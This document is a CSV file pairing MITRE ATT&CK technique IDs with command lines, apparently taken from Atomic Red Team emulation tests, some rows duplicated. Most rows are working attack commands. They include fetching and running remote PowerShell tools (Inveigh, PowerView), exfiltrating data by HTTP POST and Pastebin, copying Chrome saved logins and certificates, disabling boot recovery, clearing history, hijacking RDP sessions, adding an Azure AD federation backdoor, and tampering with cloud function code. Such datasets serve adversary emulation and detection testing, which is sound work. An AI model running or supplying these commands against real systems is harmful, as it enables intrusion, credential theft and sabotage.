mitre_id,command
T1619,"az login # login to azure # get all storage accounts in the subscription $storageaccounts = az storage account list --query ""[].{name:name, resourcegroup:resourcegroup}"" --output json | convertfrom-json $storageaccountobjects = @() $downloadedfunctionfiles = @() foreach ($account in $storageaccounts) { write-output ""`nfound storage account $($account.name)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = """" } $allowsharedkeyaccess = az storage account show --name $account.name --resource-group $account.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { $connectionstring = az storage account show-connection-string --name $account.name --resource-group $account.resourcegroup --query connectionstring --output tsv $fileshares = az storage share list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($fileshare in $fileshares) { write-output ""found file share: $($fileshare)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = $fileshare containername = """" blobname = """" tablename = """" queuename = """" } } $containers = az storage container list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($container in $containers) { write-output ""found container: $($container)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = """" tablename = """" queuename = """" } $blobs = az storage blob list --connection-string $connectionstring --container-name $container --query ""[].name"" --output json | convertfrom-json foreach($blob in $blobs) { write-output ""found blob: $($blob)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = $container blobname = $blob tablename = """" queuename = """" } } } $tables = az storage table list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($table in $tables) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = $table queuename = """" } } $queues = az storage queue list --connection-string $connectionstring --query ""[].name"" --output json | convertfrom-json foreach($queue in $queues) { write-output ""found table: $($table)"" $storageaccountobjects += [pscustomobject]@{ resourcegroup = $account.resourcegroup storageaccountname = $account.name filesharename = """" containername = """" blobname = """" tablename = """" queuename = $queue } } } } # store file lists to csv file $storageaccountobjects | export-csv -path ""#{output_file}"" -notypeinformation write-output ""`ndownloaded storage account objects to #{output_file}"" # print lists that have been stored as csv file $storageaccountobjects | format-table -property resourcegroup, storageaccountname, filesharename, containername, blobname, tablename, queuename -autosize -wrap  "
T1132,"$plaintext = ([system.text.encoding]::utf8.getbytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.length]; } $cyphertext = [system.text.encoding]::utf8.getstring($cyphertext) [system.net.servicepointmanager]::expect100continue = $false invoke-webrequest -uri #{destination_url} -method post -body $cyphertext -disablekeepalive"
T1176,"# CHROMIUM $CHROMIUM = ""HTTPS://COMMONDATASTORAGE.GOOGLEAPIS.COM/CHROMIUM-BROWSER-SNAPSHOTS/WIN_X64/1153778/CHROME-WIN.ZIP"" # UBLOCK ORIGIN LITE TO TEST SIDE-LOADING $EXTENSION = ""HTTPS://GITHUB.COM/UBLOCKORIGIN/UBOL-HOME/RELEASES/DOWNLOAD/UBOLITE_2024.11.25.1376/UBOLITE_2024.11.25.1376.CHROMIUM.MV3.ZIP"" SET-LOCATION ""#{WORKING_DIR}"" SET-VARIABLE PROGRESSPREFERENCE SILENTLYCONTINUE INVOKE-WEBREQUEST -URI $CHROMIUM -OUTFILE ""#{WORKING_DIR}\CHROME.ZIP"" INVOKE-WEBREQUEST -URI $EXTENSION -OUTFILE ""#{WORKING_DIR}\EXTENSION.ZIP"" EXPAND-ARCHIVE CHROME.ZIP -DESTINATIONPATH ""#{WORKING_DIR}"" -FORCE EXPAND-ARCHIVE EXTENSION.ZIP -FORCE START-PROCESS .\CHROME-WIN\CHROME.EXE --LOAD-EXTENSION=""#{WORKING_DIR}\EXTENSION\"" -PASSTHRU"
T1609,kubectl create -f #{path} -n #{namespace} # wait 3 seconds for the instance to come up sleep 3 kubectl exec -n #{namespace} busybox -- #{command}   
T1195,"copy %temp%\explorersync.db %temp%\..\microsoft\explorersync.db schtasks /create /tn explorersync /tr ""javaw -jar %temp%\..\microsoft\explorersync.db"" /sc minute /f"
T1649,"$archive=""$env:public\t1649\atomic_certs.zip"" $exfilpath=""$env:public\t1649\certs"" add-type -assembly ""system.io.compression.filesystem"" remove-item $(split-path $exfilpath) -recurse -force -erroraction ignore mkdir $exfilpath | out-null foreach ($cert in (gci cert:\currentuser\my)) { export-certificate -cert $cert -filepath $exfilpath\$($cert.friendlyname).cer} [io.compression.zipfile]::createfromdirectory($exfilpath, $archive) # id_3392"
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y"
T1090,"[ ""$(uname)"" = 'freebsd' ] && sysrc tor_enable=""yes"" && service tor start || sudo systemctl start tor  "
T1040,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1033,"$tokenset = @{ u = [char[]]'abcdefghijklmnopqrstuvwxyz' n = [char[]]'0123456789' } $upper = get-random -count 5 -inputobject $tokenset.u $number = get-random -count 5 -inputobject $tokenset.n $stringset = $upper + $number $rad = (get-random -count 5 -inputobject $stringset) -join '' $file = ""rad"" + $rad + "".tmp"" whoami.exe /all >> #{output_path}\$file # id_6231"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."" # id_6089"
T1567,"$apikey = ""#{api_key}"" $content = ""secrets, api keys, passwords..."" $url = ""https://pastebin.com/api/api_post.php"" $postdata = @{ api_dev_key = $apikey api_option = ""paste"" api_paste_code = $content } $response = invoke-restmethod -uri $url -method post -body $postdata write-host ""your paste url: $response"""
T1555,"cp ~/library/""application support/google/chrome/default/login data"" ""/tmp/t1555.003_login data"" cp ~/library/""application support/google/chrome/default/login data for account"" ""/tmp/t1555.003_login data for account"" "
T1040,pktmon.exe start --etw -f %temp%\t1040.etl timeout /t 5 >nul 2>&1 pktmon.exe stop
T1497,"$manufacturer = get-wmiobject -class win32_computersystem | select-object -expandproperty ""manufacturer"" $model = get-wmiobject -class win32_computersystem | select-object -expandproperty ""model"" if((($manufacturer.tolower() -eq ""microsoft corporation"") -and ($model.tolower().contains(""virtual""))) -or ($manufacturer.tolower().contains(""vmware"")) -or ($model.tolower() -eq ""virtualbox"")) {write-host ""virtualization environment detected!""} else {write-host ""no virtualization environment detected!""}"
T1222,takeown.exe /f #{file_folder_to_own} /r 
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f 
T1115,apt install xclip -y history | tail -n 30 | xclip -sel clip xclip -o > history.txt
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}"" # id_9603"
T1113,"add-type -assemblyname system.windows.forms $screen = [windows.forms.systeminformation]::virtualscreen $bitmap = new-object drawing.bitmap $screen.width, $screen.height $graphic = [drawing.graphics]::fromimage($bitmap) $graphic.copyfromscreen($screen.left, $screen.top, 0, 0, $bitmap.size) $bitmap.save(""#{output_file}"")   "
T1571,test-netconnection -computername #{domain} -port #{port} # id_8869
T1497,"$manufacturer = get-wmiobject -class win32_computersystem | select-object -expandproperty ""manufacturer"" $model = get-wmiobject -class win32_computersystem | select-object -expandproperty ""model"" if((($manufacturer.tolower() -eq ""microsoft corporation"") -and ($model.tolower().contains(""virtual""))) -or ($manufacturer.tolower().contains(""vmware"")) -or ($model.tolower() -eq ""virtualbox"")) {write-host ""virtualization environment detected!""} else {write-host ""no virtualization environment detected!""} "
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{session_id} /dest:#{destination_id}"" net start sesshijack"
T1010,"c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:#{output_file_name} ""#{input_source_code}"" #{output_file_name}   "
T1129,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""   "
T1553,"$cert = import-certificate -filepath #{pfx_path} -certstorelocation cert:\localmachine\my move-item -path $cert.pspath -destination ""cert:\localmachine\root"""
T1610,docker build -t t1610 $pathtoatomicsfolder/t1610/src/ docker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh
T1557,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/kevin-robertson/inveigh/82be2377ade47a4e325217b4144878a59595e750/inveigh.ps1"" -usebasicparsing) invoke-inveigh -consoleoutput y -nbns y -mdns y -https y -proxy y # id_4414"
T1135,smbstatus --shares
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js  "
T1057,"start-process -filepath ""$env:programfiles\process hacker 2\#{processhacker_exe}"" "
T1140,"mkdir ""#{output_dir}"" >nul 2>&1 echo hello from atomic red team > ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" makecab ""pathtoatomicsfolder\t1140\src\art-expand-source.txt"" ""#{cab_path}"" pushd ""#{output_dir}"" expand ""#{cab_path}"" -f:* . popd  "
T1490,bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no
T1497,"$error.clear() get-wmiobject -query ""select * from msacpi_thermalzonetemperature"" -erroraction silentlycontinue if($error) {echo ""virtualization environment detected""}  "
T1055,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/usodll/get-usoclientdllsystem.ps1')
T1007,"if [ ""$(uname)"" = 'freebsd' ]; then service -e; else systemctl --type=service; fi;   "
T1219,"INVOKE-WEBREQUEST -OUTFILE C:\USERS\$ENV:USERNAME\DESKTOP\ANYDESK.EXE HTTPS://DOWNLOAD.ANYDESK.COM/ANYDESK.EXE $FILE1 = ""C:\USERS\"" + $ENV:USERNAME + ""\DESKTOP\ANYDESK.EXE"" START-PROCESS $FILE1 /S;"
T1612,docker build -t t1612 $pathtoatomicsfolder/t1612/src/ docker run --name t1612_container --rm -d -t t1612 docker exec t1612_container ./test.sh   
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js # id_3731"
T1113,"reg add ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /t reg_dword /d 0 /f reg delete ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /f"
T1569,LAUNCHCTL SUBMIT -L #{LABEL_NAME} -- #{EXECUTABLE_PATH}
T1137,"copy ""pathtoatomicsfolder\t1137.006\bin\addins\pptvbaaddin.ppam"" ""$env:appdata\microsoft\addins\notepad.ppam"" $ver = (new-object -comobject ""powerpoint.application"").version $excelregpath=""hkcu:\software\microsoft\office\$ver\powerpoint\addins\notepad"" new-item -type directory $excelregpath -force | out-null new-itemproperty $excelregpath ""autoload"" -value ""1"" -propertytype dword | out-null new-itemproperty $excelregpath ""path"" -value ""notepad.ppam"" -propertytype string | out-null stop-process -name ""powerpnt"" -erroraction ignore start-process ""powerpnt""   "
T1020,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{}"
T1070,unset histfile export histfilesize=0 history -c
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive # id_3707"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f 
T1033,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); invoke-userhunter -stealth -verbose
T1580,"export aws_region=#{aws_region} cd #{stratus_path} echo ""stratus: start warmup."" ./stratus warmup aws.discovery.ec2-enumerate-from-instance echo ""stratus: start detonate."" ./stratus detonate aws.discovery.ec2-enumerate-from-instance "
T1528,"az login # log in to azure cli $allowsharedkeyaccess = az storage account show --name ""#{storage_account_name}"" --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { # download file for cleanup $tmporiginalfilename = [system.io.path]::getfilename(""#{file_path}"") $tmporiginalfunctioncode = join-path $env:temp/ (""t1528_tmp_original_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmporiginalfunctioncode if ($lastexitcode -eq 0) { # upload new funciton code if download of existing code succeeded if (""#{execution_option}"" -eq ""insert_code"") { # download file from file share for injection $tmpfunctioncode = join-path $env:temp/ (""t1528_tmp_to_inject_"" + $tmporiginalfilename) az storage file download --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --only-show-errors --dest $tmpfunctioncode if ($lastexitcode -ne 0) { write-output ""function code download failed."" exit 1 } write-output ""file downloaded: $($tmpfunctioncode)"" $insertcontent = get-content -path ""#{code_to_insert_path}"" -raw # load the content of the insert file $content = get-content -path $tmpfunctioncode -raw # inject code to file $content = $insertcontent + ""`n"" + $content # insert the new code at the beginning $content | set-content -path $tmpfunctioncode # write the modified content to the file # upload file to file share az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source $tmpfunctioncode --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } elseif (""#{execution_option}"" -eq ""replace_file"") { az storage file upload --account-name ""#{storage_account_name}"" --share-name ""#{file_share_name}"" -p ""#{file_path}"" --source ""#{code_to_insert_path}"" --only-show-errors if ($lastexitcode -ne 0) { write-output ""function code upload failed."" exit 1 } write-output ""uploaded the tampered file"" } else { write-output ""please choose a valid execution_option"" exit 1 } } else { write-output ""download original function code failed."" exit 1 } }"
